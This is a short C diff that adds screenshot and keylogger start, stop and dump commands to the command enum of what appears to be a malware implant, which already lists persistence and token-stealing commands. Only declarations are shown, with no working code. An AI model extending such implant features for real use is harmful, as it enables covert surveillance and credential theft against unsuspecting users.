@@ -93,6 +93,10 @@ typedef enum {
     CMD_PERSIST,        /* Ajoute de la persistence */
     CMD_TOKEN_LIST,     /* Liste les tokens */
     CMD_TOKEN_STEAL,    /* Vole un token */
+    CMD_SCREENSHOT,     /* Capture d'écran */
+    CMD_KEYLOG_START,   /* Démarre le keylogger */
+    CMD_KEYLOG_STOP,    /* Arrête le keylogger */
+    CMD_KEYLOG_DUMP,    /* Récupère les frappes */
     CMD_MAX
 } command_type_t;
 
